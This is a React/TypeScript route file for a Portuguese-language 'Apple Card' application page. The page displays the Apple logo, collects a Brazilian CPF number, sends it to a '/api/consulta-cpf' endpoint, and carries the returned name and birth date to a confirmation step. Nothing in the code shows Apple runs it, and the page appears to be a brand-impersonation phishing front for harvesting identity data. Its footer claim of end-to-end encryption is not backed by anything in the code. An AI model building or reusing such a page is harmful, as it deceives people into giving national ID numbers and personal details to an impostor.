import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { LoaderCircle, LockKeyhole, Shield, UserRound } from "lucide-react";
import appleLogo from "@/assets/apple-logo.svg.asset.json";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

export const Route = createFileRoute("/solicitar/")({
  head: () => ({
    meta: [
      { title: "Solicitar Apple Card — Verificar identidade" },
      { name: "description", content: "Etapa de identificação da solicitação do Apple Card." },
      { property: "og:title", content: "Solicitar Apple Card — Verificar identidade" },
      { property: "og:description", content: "Etapa de identificação da solicitação do Apple Card." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [{ rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" }],
  }),
  component: Application,
});

export type Consulta = { nome: string; nascimento: string | null; cpf: string };

declare module "@tanstack/react-router" {
  interface HistoryState {
    consulta?: Consulta;
  }
}

function Application() {
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  function formatCpf(value: string) {
    return value.replace(/\D/g, "").slice(0, 11)
      .replace(/^(\d{3})(\d)/, "$1.$2")
      .replace(/^(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
      .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const digits = cpf.replace(/\D/g, "");
    if (digits.length !== 11 || loading) return;
    setLoading(true);
    setError(null);
    try {
      const response = await fetch("/api/consulta-cpf", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cpf: digits }),
      });
      const payload = (await response.json().catch(() => null)) as
        | { nome?: string; nascimento?: string | null; erro?: string }
        | null;
      if (!response.ok || !payload?.nome) {
        setError(payload?.erro ?? "Consulta indisponível no momento. Tente novamente.");
        return;
      }
      await navigate({
        to: "/solicitar/confirmar",
        state: { consulta: { nome: payload.nome, nascimento: payload.nascimento ?? null, cpf: digits } },
      });
    } catch {
      setError("Consulta indisponível no momento. Tente novamente.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="mx-auto flex min-h-svh max-w-xl flex-col bg-background font-sans">
      <header className="flex h-[66px] shrink-0 items-center justify-center gap-1.5 border-b text-lg font-semibold">
        <img src={appleLogo.url} alt="Apple" className="h-5 w-5 object-contain" /> Card
      </header>
      <main className="flex-1 px-6">
        <ol aria-label="Etapas da solicitação" className="mt-5 flex items-center justify-center gap-2">
          <li aria-current="step" aria-label="Etapa 1: identidade" className="h-2 w-6 rounded-full bg-brand" />
          <li aria-hidden="true" className="h-0.5 w-5 bg-application-disabled" />
          <li aria-label="Etapa 2: pendente" className="h-2 w-2 rounded-full bg-application-disabled" />
          <li aria-hidden="true" className="h-0.5 w-5 bg-application-disabled" />
          <li aria-label="Etapa 3: pendente" className="h-2 w-2 rounded-full bg-application-disabled" />
        </ol>
        <div className="mx-auto mt-8 flex h-16 w-16 items-center justify-center rounded-2xl bg-brand-soft text-brand">
          <UserRound aria-hidden="true" className="h-6 w-6" />
        </div>
        <h1 className="mt-5 text-center text-2xl font-bold">Verificar Identidade</h1>
        <p className="mt-2 text-center text-[15px] leading-relaxed text-muted-foreground">Informe seu CPF para iniciarmos a análise do seu Apple Card.</p>
        <form className="mx-auto mt-8 max-w-[360px]" onSubmit={handleSubmit}>
          <label htmlFor="cpf" className="mb-2 block text-sm font-medium">CPF</label>
          <div className="relative">
            <LockKeyhole aria-hidden="true" className="absolute left-4 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
            <Input id="cpf" name="cpf" inputMode="numeric" autoComplete="off" placeholder="000.000.000-00" value={cpf} onChange={(event) => { setCpf(formatCpf(event.target.value)); setError(null); }} className="h-[54px] rounded-xl border-application-disabled pl-11 text-lg shadow-none md:text-lg" aria-describedby="application-notice" />
          </div>
          <Button type="submit" disabled={cpf.replace(/\D/g, "").length !== 11 || loading} className="mt-6 h-[52px] w-full rounded-xl bg-brand text-base font-bold text-primary-foreground hover:bg-brand/90 disabled:bg-application-disabled disabled:opacity-100">
            {loading ? <LoaderCircle aria-hidden="true" className="h-5 w-5 animate-spin" /> : "Continuar"}
          </Button>
          {error && <p id="application-notice" role="status" className="mt-4 text-center text-xs leading-relaxed text-destructive">{error}</p>}
        </form>
      </main>
      <footer className="flex items-center justify-center gap-1.5 px-6 pb-12 pt-8 text-center text-xs text-muted-foreground">
        <Shield aria-hidden="true" className="h-3.5 w-3.5 shrink-0" /> Seus dados são protegidos com criptografia de ponta a ponta
      </footer>
    </div>
  );
}
